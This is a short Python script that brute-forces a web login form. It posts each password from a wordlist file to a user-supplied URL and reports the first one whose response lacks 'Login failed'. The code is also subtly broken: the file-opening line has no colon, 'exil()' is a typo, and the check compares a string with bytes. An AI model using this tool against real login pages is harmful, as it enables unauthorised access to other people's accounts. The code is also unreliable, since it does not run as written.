import requests

target_url = input("Input the target URL > ")
#The dictionary below can be adjusted with the element input found when inspecting a webpage.
data_var = {"username": "", "password": "", "Login": "submit"}

#Replace the library file and location with your list to try.
with open("/root/Downloads/library.list", "r") as wordlist
    for line in wordlist:
        word = line.strip()
        data_var["password"] = word
        response = requests.post(target_url, data=data_var)
        if "Login failed" not in response.content:
            print("[+] Password Retrieved: " + word)
            exil()

print("End encountered")
